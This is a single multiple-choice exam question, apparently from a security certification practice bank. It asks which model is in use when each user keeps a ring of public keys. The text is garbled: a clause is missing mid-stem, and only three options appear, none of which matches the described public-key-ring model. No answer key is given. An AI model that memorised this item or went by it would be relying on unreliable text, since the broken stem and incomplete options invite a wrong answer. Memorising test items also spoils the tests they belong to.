145,"Jane is working as a security professional at CyberSol Inc. She was tasked with ensuring the authentication
and integrity of messages being transmitted in the corporate network. To encrypt the messages, she
implemented a security model in which every user in the network maintains a ring of public keys. In this

message using their private key. What is the security model implemented by Jane to secure corporate
messages?
A.  Zero trust network
B.  Transport Layer Security (TLS)
C.  Secure Socket Layer (SSL)
